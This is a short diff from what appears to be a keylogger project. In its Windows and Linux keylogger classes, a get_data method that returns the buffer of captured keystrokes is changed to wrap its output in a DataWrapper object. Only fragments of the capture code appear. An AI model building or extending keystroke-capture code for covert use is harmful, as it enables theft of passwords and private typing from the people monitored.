@@ -56,13 +56,13 @@ class WindowsKeylogger:
         """
         keyboard.unhook_all()
 
-    def get_data(self) -> List[str]:
+    def get_data(self) -> DataWrapper:
         """
         get the data that has been collected and reset the buffer.
         """
         data = self.buffer.copy()
         self.buffer.clear()  # איפוס ה-buffer
-        return data
+        return DataWrapper(data)
 
     def _on_key_event(self, event):
         """
@@ -90,7 +90,7 @@ class LinuxKeylogger:
         if self.listener.is_alive():
             self.listener.stop()
 
-    def get_data(self) -> List[str]:
+    def get_data(self) -> DataWrapper:
         """
         get the data that has been collected and reset the buffer.
         """
